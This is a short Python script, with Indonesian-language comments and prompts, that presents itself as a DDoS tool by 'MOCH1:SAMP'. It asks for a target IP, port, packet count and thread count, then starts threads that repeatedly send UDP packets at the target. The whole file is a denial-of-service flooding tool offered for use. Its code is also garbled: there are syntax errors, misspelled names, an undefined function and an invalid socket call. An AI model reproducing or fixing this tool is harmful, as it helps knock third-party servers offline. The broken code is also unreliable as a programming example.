#Coding By MOCH1:SAMP
#No Rename
#No Abuse Kontol
import random
import socket
import threading
import os

os.system("clear")
print("DDos Tools By MOCH1:SAMP")
print("SUBSCRIBE MOCH1:SAMP")
print("JANGAN ABUSE YA TOD")
ip = str(input(" Masukan Ip Target: "))
port = int(input(" Masukan Port Target: "))
choice = str(input(" Gass Kirim Paket?(y/n) "))
times = int(input(" Paket Yang Mau Lu Kirim: "))
threads = int(input(" Threads: "))
def run():
	data = random_unrandom(9024)
	i = random.choice(("[✓]"))
	while True:
	  try:
		 s = socket.socket(socket.AF _INET, socket.SOCK_DGRAM, socket.SOCK_STREAM)
         addr = (str(ip),int(port))
         for x in range(times)
            s.sendto(data,adr)
         pint(i + " | TOK TOK TOK PERMISI PAKET!!|"))
       except:
         print([i] " | TOK TOK TOK PERMISI PAKET!! |"))
for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
         
         
         
         